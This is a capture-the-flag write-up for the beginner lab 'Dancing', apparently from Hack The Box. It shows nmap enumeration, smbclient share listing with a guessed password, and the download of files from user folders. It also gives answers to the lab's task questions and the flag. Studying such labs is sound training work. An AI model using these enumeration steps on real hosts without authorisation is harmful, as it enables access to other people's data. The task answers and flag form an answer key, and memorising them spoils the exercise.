@@ -1,0 +1,122 @@
+---
+tags: []
+sidebar_position: 3
+---
+# Dancing
+
+- **Difficulty:** Very easy
+
+---
+
+## 🔎 Solution
+With the target IP in hand I ran an Nmap service/version scan to enumerate running services and their versions:
+```
+> nmap -sV 10.129.202.193
+
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+The scan returned 3 open ports and their associated services:
+* 135/tcp - Microsoft Windows RPC
+* 139/tcp - Microsoft Windows netbios-ssn
+* 445/tcp - microsoft-ds? (this is the canonical service name for SMB over TCP)
+
+For this lab I focused on port 445 (SMB). 
+**SMB (Server Message Block)** is the protocol used for Windows file and printer sharing; historically it has been the vector for large ransomware outbreaks such as WannaCry, which propagated via an SMB vulnerability - a reminder that exposed SMB services on the internet are high-risk and worth auditing in CTF/lab scenarios.
+
+On Linux, `smbclient` is a handy tool for interacting with SMB shares. 
+First I listed the shares on the host:
+```
+> smbclient -L //10.129.202.193
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        WorkShares      Disk      
+Reconnecting with SMB1 for workgroup listing.
+```
+At the `WORKGROUP\kali` prompt I tried a common password (`kali`) and was able to authenticate. 
+The shares returned can be interpreted as follows:
+* `ADMIN$`, `C$` - administrative shares (typically only accessible to administrators).
+* `IPC$` - used for inter-process communication / named pipes (remote administration).
+* `WorkShares` - a user-created disk share likely containing user data.
+
+I connected to the `WorkShares` share using `smbclient \\<IP>\<sharename>` and browsed its contents. 
+Listing the top-level directory showed 2 user folders:
+```
+smb: \> ls
+  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+
+                5114111 blocks of size 4096. 1754177 blocks available
+```
+I changed into `Amy.J` and found a small note file, which I downloaded with `get`:
+```
+smb: \> cd Amy.J
+smb: \Amy.J\> ls
+  .                                   D        0  Mon Mar 29 05:08:24 2021
+  ..                                  D        0  Mon Mar 29 05:08:24 2021
+  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
+
+                5114111 blocks of size 4096. 1754174 blocks available
+smb: \Amy.J\> get worknotes.txt
+getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+```
+The file contents were just operational notes (no flag):
+```
+> cat worknotes.txt 
+- start apache server on the linux machine
+- secure the ftp server
+- setup winrm on dancing 
+```
+I repeated the process for the `James.P` folder and found `flag.txt`, which I downloaded:
+```
+smb: \> cd James.P
+smb: \James.P\> ls
+  .                                   D        0  Thu Jun  3 04:38:03 2021
+  ..                                  D        0  Thu Jun  3 04:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
+
+                5114111 blocks of size 4096. 1754174 blocks available
+smb: \James.P\> get flag.txt 
+getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+Reading the file revealed the flag:
+```
+> cat flag.txt     
+5f61c10dffbc77a704d76016a22f1664 
+```
+That completed the SMB-based retrieval flow: service enumeration with `nmap -sV`, discover SMB on port 445, list shares with `smbclient -L`, authenticate, browse shares, and download the target file containing the flag.
+
+## ✏️ Task answers
+**Task 1: What does the 3-letter acronym SMB stand for?**
+> Server Message Block
+
+**Task 2: What port does SMB use to operate at?**
+> 445
+
+**Task 3: What is the service name for port 445 that came up in our Nmap scan?**
+> microsoft-ds
+
+**Task 4: What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?**
+> -L
+
+**Task 5: How many shares are there on Dancing?**
+> 4
+
+**Task 6: What is the name of the share we are able to access in the end with a blank password?**
+> WorkShares
+
+**Task 7: What is the command we can use within the SMB shell to download the files we find?**
+> get
+
+## 🚩Flag
+> `5f61c10dffbc77a704d76016a22f1664`
